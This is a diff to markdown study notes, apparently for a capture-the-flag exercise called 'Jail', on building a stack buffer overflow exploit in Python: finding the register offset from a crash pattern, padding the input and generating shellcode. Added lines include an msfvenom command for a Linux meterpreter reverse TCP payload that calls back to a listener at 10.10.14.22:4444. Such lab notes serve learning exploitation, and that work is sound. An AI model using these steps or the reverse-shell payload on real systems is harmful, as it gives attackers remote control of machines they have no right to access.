@@ -32,10 +32,23 @@
 ## Generating an attack in python
 + first you need to create a seg fault by generating a pattern with the python code, then seeing the registers overwritten
   + this can also help determine endianness.  Little endian is where the values you see overwritten are reverse.  So if you overwrite the register with input string "abcd", then the hex value found after the program crashes will equal "dcba"
++ you'll take the value found in the register you want to overwrite (probably EIP), and search for it in the string pattern created earlier.  The one that caused the program to crash.  From this, you'll get an offset number
 + NOTE: an example of this is in the Jail example, it has nice comments, and should be used as an example
 + Libraries:
   + from pwn import *
   + import struct
++ Important pieces:
+  + the offset: this is the number you got from the pattern
+    + offset = 'A' * [your number]
+  + the shellcode: you'll need to generate this
+    + you'll have to find some code that works for the system you're exploiting.
+    + $> msfvenom -l payloads | grep linux 
+    + then you'll have to generate the payload specific to you're ip and port
+    + $> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f py
+  + the value you want to write into the register
+    + this is a little tricky, you want this value to point to where the shell code will be written to
+    + in the case of jail, we are given the address we want to write into the register because the program prints out the userpass address when run in debug mode
+
 
 
 
